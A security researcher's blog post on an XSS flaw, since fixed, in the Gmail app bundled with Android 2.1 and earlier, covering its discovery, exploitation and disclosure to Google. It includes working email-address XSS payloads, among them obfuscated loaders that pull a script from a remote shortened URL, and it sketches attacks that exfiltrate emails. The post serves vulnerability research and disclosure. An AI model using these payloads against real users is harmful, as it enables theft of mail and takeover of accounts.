---
title: Example of an Old Gmail XSS Exploit on Android
layout: post
tags: android
---

This post documents an XSS vulnerability that I discovered in the default Gmail app (v1.3) provided by Google in Android 2.1 and prior. All versions included in Android up to and including 2.1 seem to be affected, but the bug was unintentionally patched in Froyo (2.2) when Google updated the application to v2.3. The vulnerability let an attacker execute arbitrary Javascript in a local context on the phone, which made it possible to read the victim's emails (and the contacts mentioned in those emails) off of the phone, download certain files to phone (and open them), and more easily perform various other attacks that have previously been documented to take further control of the phone. Less seriously, it was also possible to crash the application repeatedly, resulting in a denial-of-service situation. The flaw has now been fixed via server-side patch to the Gmail API.

## Discovery

During a night of drinking a couple months ago, I got into a discussion with my roommate (his personal blog, cause I promised) about what characters are valid in email addresses. Although many filters only allow [a-zA-Z0-9_-] plus maybe a few more as valid characters in the local-part of the address, I was convinced that I had previously seen email addresses that used characters outside of that character set, as well as filters that allowed for a wider range of characters. As I normally do during bouts of drinking, I immediately consulted the RFC to settle the dispute (RFC 5322). Sure enough, it is apparently allowed, but discouraged, under the RFC to have an email address in the following format: "i<3whate\/er"@mydomain.com . As long as the quotation marks are present, it is technically a valid email address.

Seeing that this might trip up the ill-informed, I decided to see if Gmail handled this case correctly. I wrote up a quick test in Python and used one of the many open SMTP relays on campus (another rant for another time) to shoot an email at my Gmail account. While the main Gmail interface handled the problem with relative ease (there were some small pattern matching issues when replying), I was a little surprised to see something like the following when I opened the email on my phone:

Clearly, there was an XSS vulnerability in the Gmail app. The root cause, upon further investigation, was that the application was using the raw source email address as an ID for the contact presence image (the online/offline icon). An honest mistake, given the extremely limited use of special characters in email addresses, but serious nonetheless. To see if the issue affected all versions of Android, I sent one to my roommate (who has Froyo), and one to my rather outdated emulator running Android 1.5. The flaw was present in 1.5, but Froyo's version was unaffected. I haven't tested on versions between 1.5 and 2.1, but I would assume that the bug has been present the entire time. To prove that I could indeed execute Javascript, I first tried sending an email with the following from address:

"><script>window.location='http://google.com'</script>"@somedmn.com

However, this email got blocked by Gmail's spam filters. Although at first I thought that they might be aware of the vulnerability and had tried to mitigate it, it quickly became apparent that it was simply blocking all emails with "<" in the from address. Weird, but not a show stopper. To get around this, I used the fact that the XSS was present in the image tag and abused the onload attribute for execution:

" onload=window.location='http://google.com'"@somedmn.com

Sure enough, the email got through, and when viewed, I ended up looking at Google!
Android XSS Google

Android XSS Google
Exploitation

While redirecting to Google is fun and all, doing anything more complicated required some work. Achieving arbitrary execution was somewhat of a small challenge, given that the email address is limited by the RFC to 254 characters in length, I could not use any "<" symbols because of the Gmail filter, and, I could not use any quotation marks in the actual Javascript. To complicate matters, a simple document.write("<script>window.location='http://google.com'</script>") didn't work in this situation. However, in spite of these things, I was able to throw together a payload that updates the DOM correctly and creates a script tag with a remote source, weighing in at ~225 characters with the domain attached.

Escaped:
" onload='var f=String.fromCharCode;var d=document;var s=d.createElement(f(83,67,82,73,80,84));s.src=f(47,47,66,73,84,46,76,89,47,105,51,51,72,100,86);d.getElementsByTagName(f(72,69,65,68))[0].appendChild(s);' "@somedmn.com

Unescaped:
" onload='var d=document;var s=d.createElement("SCRIPT");s.src="//BIT.LY/i33HdV";d.getElementsByTagName("HEAD")[0].appendChild(s);' "@somedmn.com

Of course, this is in all likelihood not the best way I could of done this, but it worked well. I'd love to see better solutions if people have them.

EDIT: Here's a much cleaner and simpler version, courtesy of R (see comments). I especially liked the use of an attribute for storing the URL string.

" title='http://bit.ly/i33HdV' onload='d=document;(s=d.createElement(/script/.source)).src=this.title;d.getElementsByTagName(/head/.source)[0].appendChild(s)' "@somedmn.com

With this in place, I could now do some more interesting things. First, I dumped the page source so I could see better how exactly the application worked. The Gmail app is closed source and the page is dynamically generated in the Java code, so it was useful to get a dump of that . I also grabbed the Gmail apk and unzipped it, which gave me the Javascript API available to the application. I would provide this code, but I don't want to get into any copyright issues by distributing it here (it's pretty easy to get on your own, anyway). Finally, vaguely following Thomas Cannon's wonderful guide on Android reversing, I decompiled the Java bytecode of the app to get a better idea of what I might be able to do.

Probably the easiest way to exploit this vulnerability would be simply to launch a phishing attack that redirects users to a fake mobile Gmail login page, in the hopes that they will happily log in to continue viewing their emails. However, this was not a particularly interesting or creative thing to do with the vulnerability, simple though it may be.

After reading through some of the code, the main attack that jumped out at me was to dump emails off the phone. Using some very simple Javascript, one could simply grab all the emails on the phone and submit them to a remote server. Doing things this way might not be practical in a real attack though, given the time it would take to gather every email on the device. A better technique is to utilize cross origin requests to send each email as it's being queried, meaning that an attacker will get the emails as soon as they're queried (naive demo code here). To give the attacker more time to gather emails, one could run the dumping code while also doing something like periodically spamming the user with requests to add a contact, giving the attack precious time to collect more data.  Rather than dumping all the emails, though, a smarter use of this exploit would be to reset a user's password to another service, and then send an attack email soon afterwards. If the target opened it, we could simply grab the last 2 or 3 emails and easily gain access to the account we reset.

In addition to the email dumping, some other interesting functions caught my eye: download, preview, and showExternalResources. Although not used anywhere in the script.js file that I grabbed from the apk file, these methods were public in the decompiled Java API, meaning they could be called via Javascript in the window. Using these functions with the proper parameters, it was possible to download arbitrary files to the phone without permission, cause external resources to be rendered, and to automatically open various attached files (such as document files). Obviously, all of these would provide an easy vector for various attacks.

Beyond these more serious problems, it was also possible to do various odd things, like prompt the user to add a contact, set a label, open up a new email to a target of our choosing, or automatically open up a forward/reply message to an email. Overall though, the Javascript API in the app did a fairly good job at preventing abuse, at least when compared to platforms such as WebOS. I was unable in my tests to gain unrestricted access to sending permissions or further compromise data on the phone beyond the emails without using other vulnerabilities.

One must also keep in mind that beyond these vulnerability-specific threats, the flaw also allowed for much easier (and quieter) exploitation of other vulnerabilities that have been found by other researchers, including the data-stealing bug and various arbitrary code execution vulnerabilities in WebKit (like this). It also allowed for the exploitation of any number of file format bugs that might have been found in the future. Exploiting any of these would be as easy as getting a user to open up an email. Worse, the user would have no idea until it was too late, as one could set the From header appropriately to make the email look legitimate (i.e., to something other than Test :P ):

And yes, that email executes arbitrary Javascript (shown here trying to add the user "Test;--" to the contact list):



## Disclosure

I found the bug on 12/3/2010, and I contacted Google about 24 hours after I discovered it and confirmed it was exploitable. I received a quick initial response, but patching of the vulnerability on the server side was not completed until 1/28/11, apparently because of decreased staffing levels over the holiday. The patch was applied server-side in the Gmail API, and works by converting the special characters into their corresponding HTML entities. The Google security people were, as in all my previous communications with them, polite and professional, and I want to thank them for addressing the issue in a reasonable timeframe.

Overall, it was a pretty interesting vulnerability, and it was a good opportunity for me to learn a little more about Android. I had a good time familiarizing myself with the platform, and hopefully I will be able to do some more interesting things with it in the future. It has also definitely made me think twice before I open emails on my phone, which is probably for the best. Hopefully once these platforms become more mature, we won't see as many of these simple but serious vulnerabilities. However, if the maturation process we've observed in other security domains is any indication, I wouldn't hold your breath. It's going to take time.
